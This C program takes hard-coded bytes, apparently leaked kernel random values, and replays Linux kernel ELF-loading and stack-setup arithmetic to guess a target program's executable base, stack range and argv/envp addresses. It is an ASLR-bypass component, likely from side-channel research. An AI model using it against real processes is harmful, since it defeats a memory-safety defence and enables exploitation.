#include <elf.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <linux/auxvec.h>
#include "logging.h"

typedef enum { false, true } bool;

uint8_t extraction[192] =
{
  /* First extraction */
  0x24, 0x2a, 0xd8, 0x90, 0x21, 0xb1, 0x6e, 0xca,
  0x55, 0xb0, 0x31, 0x74, 0xd7, 0xac, 0x8d, 0x79,
  0x19, 0x39, 0x88, 0x58, 0x37, 0x93, 0xba, 0xf6,
  0x54, 0x94, 0xbb, 0x17, 0xab, 0x80, 0xed, 0xed,
  0xa9, 0xff, 0xcf, 0x43, 0xb9, 0x02, 0x8e, 0x27,
  0xae, 0x4d, 0x97, 0x11, 0x30, 0x81, 0xca, 0x52,
  0xe2, 0xb9, 0x0d, 0xdd, 0x5f, 0x89, 0x66, 0xd7,
  0xe2, 0x75, 0x60, 0x51, 0x98, 0x53, 0xc5, 0x39,
  0xeb, 0x37, 0x3c, 0xd6, 0xae, 0xb9, 0x70, 0xf2,
  0xc6, 0x3d, 0x75, 0x82, 0x19, 0x12, 0x17, 0x7c,
  0x57, 0x1f, 0x59, 0xd4, 0x0e, 0xfe, 0x20, 0x14,
  0x3c, 0xf9, 0x22, 0xd2, 0xc9, 0xd3, 0x16, 0x39,
  /* Second extraction */
  0x3c, 0xce, 0x38, 0x0d, 0x64, 0x9a, 0x97, 0x79,
  0x93, 0x9a, 0x9c, 0xb1, 0x0a, 0x14, 0xda, 0xb4,
  0xd9, 0x77, 0xb1, 0x37, 0x67, 0x7d, 0xef, 0x35,
  0x47, 0x2f, 0x34, 0x92, 0x55, 0x21, 0x40, 0x21,
  0x08, 0x38, 0x7d, 0xf7, 0x70, 0xff, 0x79, 0x72,
  0x9a, 0xeb, 0x0a, 0x94, 0x0f, 0x51, 0xae, 0x4c,
  0x10, 0x73, 0xf9, 0x78, 0x0f, 0xd4, 0xd9, 0x30,
  0x35, 0x6b, 0xea, 0x8b, 0x3c, 0xfd, 0x24, 0xd5,
  0x21, 0xaa, 0xc8, 0x62, 0xe7, 0xaf, 0xd8, 0x7b,
  0xc8, 0x9f, 0x11, 0xa2, 0x83, 0x68, 0xd0, 0x21,
  0x6f, 0xce, 0x10, 0x3d, 0xe1, 0xb4, 0xe0, 0x81,
  0x97, 0x83, 0x7f, 0x3d, 0xf7, 0xb3, 0x89, 0x90
};
#define EXTRACTION       extraction
#define EXTRACTION_SZ    sizeof(EXTRACTION)
#define SEARCH_INTERVAL1  4 /* bytes */
#define SEARCH_INTERVAL2  2 /* bytes */

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1UL << PAGE_SHIFT)

#define __ALIGN_MASK(x, mask)   (((x) + (mask)) & ~(mask))
#define __ALIGN(x, a)           __ALIGN_MASK(x, (__typeof__(x))(a) - 1)
#define ALIGN(x, a)             __ALIGN((x), (a))
#define PAGE_ALIGN(addr)        ALIGN(addr, PAGE_SIZE)

#define DEFAULT_MAP_WINDOW  ((1UL << 47) - PAGE_SIZE)
#define ELF_ET_DYN_BASE     (DEFAULT_MAP_WINDOW / 3 * 2)

#define STACK_RND_MASK      0x3fffff
#define STACK_TOP           DEFAULT_MAP_WINDOW
#define STACK_EXPAND        0x20000UL
#define STACK_SIZE          0x1000UL

/* Assuming stack grows down */
#define elf_addr_t              Elf64_Off
#define STACK_ADD(sp, items)    ((elf_addr_t *)(sp) - (items))
#define STACK_ROUND(sp, items)  (((unsigned long)(sp - items)) &~ 15UL)
#define STACK_ALLOC(sp, len)    (sp -= len)

#define ELF_MIN_ALIGN       PAGE_SIZE
#define ELF_PAGESTART(_v)   ((_v) & ~(int)(ELF_MIN_ALIGN-1))
#define ELF_PLATFORM        ("x86_64")
#define ELF_BASE_PLATFORM   NULL

#define CONFIG_ARCH_MMAP_RND_BITS   28
#define CONFIG_X86_64               1
#define CONFIG_RSEQ                 1

#define EXECFD  0

struct elf_info {
  uint64_t entry; /* Entry point (ehdr->e_entry) of ELF file */
  uint64_t vaddr; /* Virtual address of first LOAD segment */
  uint64_t align; /* Alignment of first LOAD segment */
};

static bool get_elf_info(const char *path, struct elf_info *einfo)
{
  bool rv; /* Return value */
  int fd; /* File descriptor of opened `path` file */
  int i; /* Iterator */
  struct stat st; /* File info of `fd` */
  unsigned char *elf_data; /* Pointer to ELF data mapped in memory */
  Elf64_Ehdr *ehdr; /* Pointer to ELF header */
  Elf64_Phdr *phdr; /* Pointer to ELF program header */

  /* Initialize return value */
  rv = false;

  /* Open the file */
  if ((fd = open(path, O_RDONLY)) == -1 )
    handle_error("open()");

  /* Get file size */
  if ((fstat(fd, &st)) == -1)
    handle_error("stat()");

  /* Map file into memory */
  elf_data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
  if (elf_data == MAP_FAILED)
    handle_error("mmap()");

  /* Check ELF magic number */
  if (elf_data[0] != ELFMAG0 ||
      elf_data[1] != ELFMAG1 ||
      elf_data[2] != ELFMAG2 ||
      elf_data[3] != ELFMAG3)
    handle_error_no_en("%s is not a valid ELF file!\n", path);

  /* Make sure ELF is 64-bit */
  if (elf_data[EI_CLASS] != ELFCLASS64)
    handle_error_no_en("%s is not a 64-bit ELF file!\n", path);

  /* Get pointers to the elf header and program header */
  ehdr = (Elf64_Ehdr *)elf_data;
  phdr = (Elf64_Phdr *)((uint8_t *)elf_data + ehdr->e_phoff);

  /* Iterate through the program headers to find first LOAD segment */
  for (i = 0; i < ehdr->e_phnum; i++) {
    if (phdr[i].p_type == PT_LOAD) { /* Found it! */

      /* Get the entry point (do this here so everything is set or not) */
      einfo->entry = ehdr->e_entry;

      /* Get the virtual address and alignment of LOAD segment */
      einfo->vaddr = phdr[i].p_vaddr;
      einfo->align = phdr[i].p_align;

      /* Success! */
      rv = true;

      break;
    }
  }

  /* Cleanup */
  munmap(elf_data, st.st_size);
  close(fd);

  /* Return if we were successful (true) or not (false). */
  return rv;
}

static bool cpu_has_fsgsbase(void)
{
  unsigned int eax, ebx, ecx, edx;
  bool rv;

  /* Check if CPUID supports the extended feature flags */
  __asm__ __volatile__ (
    "movl $0, %%eax  \n\t"
    "cpuid           \n\t"
    /* Output */  : "=a" (eax)
    /* Input */   : 
    /* Clobber */ : "ebx", "ecx", "edx"
  );

  if (eax < 7)
    return false; /* CPUID doesn't support leaf 7 */

  /* Get extended feature flags (EAX=7, ECX=0) */
  __asm__ __volatile__ (
    "movl $7, %%eax  \n\t"
    "movl $0, %%ecx  \n\t"
    "cpuid           \n\t"
    /* Output */  : "=a" (eax), "=b" (ebx), "=c" (ecx), "=d" (edx)
    /* Input */   :
    /* Clobber */ :
  );

  /* fsgsbase is bit 0 in EBX */
  rv = ((ebx & 1) != 0);
  dbg("CPU %s fsgsbase.\n", (rv) ? "has" : "doesn't have");

  return rv;
}

static unsigned long mimic_arch_mmap_rnd(unsigned long rnd)
{
    return (rnd & ((1UL << CONFIG_ARCH_MMAP_RND_BITS) - 1)) << PAGE_SHIFT;
}

static void get_exec_base(unsigned long rnd, const struct elf_info *einfo)
{
    unsigned long load_bias = 0;

    load_bias  = ELF_ET_DYN_BASE;
    load_bias += mimic_arch_mmap_rnd(rnd);

    if (einfo->align) {
        load_bias &= ~(einfo->align - 1);
    }
    load_bias = ELF_PAGESTART(load_bias - einfo->vaddr);

    /* XXX: The `first_pt_load` stuff is skipped for now */

    log("[RND = 0x%lx] Executable image base guess: 0x%lx (0x%lx load_bias)\n",
            rnd, (einfo->entry + load_bias), load_bias);
}

static inline bool is_power_of_2(unsigned long n)
{
  return (n != 0 && ((n & (n - 1)) == 0));
}

static inline uint32_t mimic_get_random_u32_below(uint32_t ceil,
                                                  unsigned long rnd)
{
  if (!ceil)
    handle_error_no_en("get_random_u32_below() must take ceil > 0\n");

  if (ceil <= 1)
    return 0;

  for (;;) {
    if (ceil <= 1U << 8) {
      /* Take the top u8 of the rnd arg */
      uint32_t mult = ceil * ((rnd >> (7 << 3)) & 0xff);
      if (is_power_of_2(ceil) || (uint8_t)mult >= (1U << 8) % ceil)
        return mult >> 8;
    } else if (ceil <= 1U << 16) {
      /* Take the top u16 of the rnd arg */
      uint32_t mult = ceil * ((rnd >> (6 << 3)) & 0xffff);
      if (is_power_of_2(ceil) || (uint16_t)mult >= (1U << 16) % ceil)
        return mult >> 16;
    } else {
      /* Take the top u32 of the rnd arg */
      uint64_t mult = (uint64_t)ceil * ((rnd >> (4 << 3)) & 0xffffffff);
      if (is_power_of_2(ceil) || (uint32_t)mult >= -ceil % ceil)
        return mult >> 32;
    }
  }
}

static unsigned long mimic_arch_align_stack(unsigned long sp, unsigned long rnd)
{
    sp -= mimic_get_random_u32_below(8192, rnd);
    return sp & ~0xf;
}

static unsigned long get_stack_base(unsigned long rnd1, unsigned long rnd2)
{
    unsigned long stack_hi;
    unsigned long stack_lo;

    /*
     * NOTE: We assume stack grown down (CONFIG_STACK_GROWSUP = NO)
     */

    /* Get the top of the stack */
    stack_hi   = rnd1;
    stack_hi  &= STACK_RND_MASK;
    stack_hi <<= PAGE_SHIFT;
    stack_hi   = PAGE_ALIGN(STACK_TOP) - stack_hi;

    /* Adjust the top of the stack (as in `setup_arg_pages()`). */
    stack_hi = mimic_arch_align_stack(stack_hi, rnd2);
    stack_hi = PAGE_ALIGN(stack_hi);

    /* Get the bottom of the stack */
    stack_lo = stack_hi - (STACK_EXPAND + STACK_SIZE);

    log("[RND1 = 0x%lx][RND2 = 0x%lx] Stack range guess: [0x%lx - 0x%lx]\n",
          rnd1, rnd2, stack_lo, stack_hi);

    /* Return stack starting address (the high address since we grow down) */
    return stack_hi;
}

static void get_env_base(unsigned long p, unsigned long rnd, int argc,
                          int envc, bool has_fsgsbase)
{
    elf_addr_t *sp;
    const char *k_platform = ELF_PLATFORM;
    const char *k_base_platform = ELF_BASE_PLATFORM;
    size_t len;
    int ei_index;
    int items;

    /*
     * To avoid L1 evictions by the processes running on the
     * same package, the initial stack is shuffled.
     */
    dbg("[%s] p prior to arch_align_stack()    = 0x%lx\n", __func__, p);
    p = mimic_arch_align_stack(p, rnd);
    dbg("[%s] p after arch_align_stack()       = 0x%lx\n", __func__, p);

    /* Adjust stack if arch has a platform capability string */
    if (k_platform) {
        len = strlen(k_platform) + 1;
        STACK_ALLOC(p, len);
    }

    /* Adjust stack if arch has a "base" platform capability string */
    if (k_base_platform) {
        len = strlen(k_base_platform) + 1;
        STACK_ALLOC(p, len);
    }

    /* Adjust stack by 16 (random) bytes used for userspace PRNG seeding */
    STACK_ALLOC(p, 16);

    dbg("[%s] p prior to elf_info adjustment   = 0x%lx\n", __func__, p);

    /* Adjust stack for auxiliary vector information */
    ei_index = 0;

#define NEW_AUX_ENT(id) ei_index += 2
#if CONFIG_X86_64 == 1
    /* +++ ARCH_DLINFO +++ */
    NEW_AUX_ENT(AT_SYSINFO_EHDR);
    NEW_AUX_ENT(AT_MINSIGSTKSZ);
    /* --- ARCH_DLINFO --- */
#endif /* CONFIG_X86_64 == 1 */
    NEW_AUX_ENT(AT_HWCAP);
    NEW_AUX_ENT(AT_PAGESZ);
    NEW_AUX_ENT(AT_CLKTCK);
    NEW_AUX_ENT(AT_PHDR);
    NEW_AUX_ENT(AT_PHENT);
    NEW_AUX_ENT(AT_PHNUM);
    NEW_AUX_ENT(AT_BASE);
    NEW_AUX_ENT(AT_FLAGS);
    NEW_AUX_ENT(AT_ENTRY);
    NEW_AUX_ENT(AT_UID);
    NEW_AUX_ENT(AT_EUID);
    NEW_AUX_ENT(AT_GID);
    NEW_AUX_ENT(AT_EGID);
    NEW_AUX_ENT(AT_SECURE);
    NEW_AUX_ENT(AT_RANDOM);
    if (has_fsgsbase) NEW_AUX_ENT(AT_HWCAP2);
    NEW_AUX_ENT(AT_EXECFN);
    if (k_platform) NEW_AUX_ENT(AT_PLATFORM);
    if (k_base_platform) NEW_AUX_ENT(AT_BASE_PLATFORM);
#if EXECFD == 1
    NEW_AUX_ENT(AT_EXECFD);
#endif /* EXECFD == 1 */
#if CONFIG_RSEQ == 1
    NEW_AUX_ENT(AT_RSEQ_FEATURE_SIZE);
    NEW_AUX_ENT(AT_RSEQ_ALIGN);
#endif /* CONFIG_RSEQ == 1 */
#undef NEW_AUX_ENT

    /* Advance past AT_NULL entry */
    ei_index += 2;

    /* Adjust stack for aux vec data */
    sp = STACK_ADD(p, ei_index);

    dbg("[%s] sp after elf_info adjustment     = %p\n", __func__, sp);

    /* Account for args and env */
    items = (argc + 1) + (envc + 1) + 1;
    p = STACK_ROUND(sp, items);
    sp = (elf_addr_t *)p;  /* sp == mm->start_stack */

    dbg("[%s] sp after argc & envc adjustment  = %p\n", __func__, sp);

    /*
     * Now we do some accounting for putting argc
     * (and argc, envp if necessary) on the stack.
     */

    /* Adjust stack for argc value */
    log2("  [RND = 0x%lx] &argc = %p\n", rnd, sp);
    sp++;

    /* Adjust stack for argv pointers */
    log2("  [RND = 0x%lx] &argv = %p\n", rnd, sp);
    sp += argc;
    sp++; /* Account for null termination in argv pointer list */

    /* Adjust stack for envp pointers */
    log2("  [RND = 0x%lx] &envp = %p\n", rnd, sp);
    sp += envc;
    sp++; /* Account for null termination in envp pointer list */

    /* elf_info comes next on the stack */
    log2("  [RND = 0x%lx] &elf_info = %p\n", rnd, sp);
}

static void print_usage(const char *prog) {
  printf("Usage: %s PROG ARGS\n", prog);
  printf("\nNote: if you are using one program execve another,\n");
  printf("      ensure that both binaries names (including the \n");
  printf("      path to them) are the same size.\n");
  /* TODO: refine the program to account for this when there is time. */
}

int main(int argc, char *argv[], char *envp[])
{
    const char *prog;
    size_t prog_path_len;
    struct elf_info einfo;
    unsigned long rnd1, rnd2, rnd3;
    unsigned long sp;
    int i, j, k;
    int arg_cnt, env_cnt;
    size_t argv_sz, envp_sz;
    size_t stack_strings_offset;
    char **env_item;
    bool has_fsgsbase;

    if (argc == 1) {
      print_usage(argv[0]);
      return EXIT_FAILURE;
    }

    /* Check if CPU has fsgsbase */
    has_fsgsbase = cpu_has_fsgsbase();

    /* Get the target program and its path length */
    prog = argv[1];
    prog_path_len = strlen(prog) + 1;
    dbg("program path size = %zu\n", prog_path_len);

    /* Get the argument count and size of arguments */
    arg_cnt = 0;
    argv_sz = 0;
    i = 1;
    while (i < argc) {
      argv_sz += (strlen(argv[i]) + 1);
      arg_cnt++;
      i++;
    }
    dbg("argv size = %zu bytes\n", argv_sz);
    dbg("arg count = %i\n", arg_cnt);

    /* Get environment size. */
    envp_sz = 0;
    env_cnt = 0;
    env_item = envp;
    while (*env_item != NULL) {
        envp_sz += (strlen(*env_item) + 1);
        env_item++;
        env_cnt++;
    }
    dbg("envp size = %zu bytes\n", envp_sz);
    envp_sz -= (strlen(argv[0]) + 1);
    dbg("envp size w/o executable name = %zu bytes\n", envp_sz);
    envp_sz += prog_path_len;
    dbg("envp size w/ target executable name = %zu bytes\n", envp_sz); 
    dbg("env count = %i\n", env_cnt);

    /* Make sure `path` is an ELF file and get the necessary info if so */
    if (!(get_elf_info(prog, &einfo)))
      handle_error_no_en("Failed to find necessary ELF information!\n");

    /* Guess executable base address */
    for (i = 0; i <= (EXTRACTION_SZ - 8); i += SEARCH_INTERVAL1) {
      rnd1 = *((uint64_t *)(&EXTRACTION[i]));
      get_exec_base(rnd1, &einfo);
    }

    /*
     * Before searching for the start and end of the stack region below,
     * calculate the offset from the top of the stack to just after the
     * argument and environment strings. 
     *
     * +-------------+ < Top of Stack
     * |  NULL (8B)  |
     * +-------------+
     * |     prog    |
     * +-------------+
     * |     envp    |
     * +-------------+
     * |     argv    |
     * +-------------+
     */
    stack_strings_offset = 8 + prog_path_len + argv_sz + envp_sz;

    /*
     * Guess start and end address of the stack using two random numbers:
     *  1. get_random_long()
     *  2. get_random_u32_below(8192)
     */
    for (i = 0; i <= (EXTRACTION_SZ - 8); i += SEARCH_INTERVAL1) {
      rnd1 = *((uint64_t *)(&EXTRACTION[i]));
      /*
       * Note that since we are pulling random numbers from a depleting batch
       * pool, the second random number can be pulled from an index greater
       * than what we use to get the first random number.
       */
      j = i + SEARCH_INTERVAL1;
      for (; j <= (EXTRACTION_SZ - 8); j += SEARCH_INTERVAL1) {
        rnd2 = *((uint64_t *)(&EXTRACTION[j]));
        sp = get_stack_base(rnd1, rnd2);

        log2("  *argv = 0x%lx\n", sp - stack_strings_offset);
        log2("  *envp = 0x%lx\n", sp - stack_strings_offset + argv_sz);

        /* 
         * For calculating the initial stack frame, we start with a pointer
         * to the stack just under the environment and argument strings.
         */
        sp -= stack_strings_offset;

        /*
         * Note that since we are pulling random numbers from a depleting batch
         * pool, the second random number can be pulled from an index greater
         * than what we use to get the second random number.
         */
        k = j + SEARCH_INTERVAL2;
        for (; k <= (EXTRACTION_SZ - 8); k += SEARCH_INTERVAL2) {
          rnd3 = *((uint64_t *)(&EXTRACTION[k]));
          get_env_base(sp, rnd3, arg_cnt, env_cnt, has_fsgsbase);
        }
      }
    }

    /* Success! */
    return 0;
}
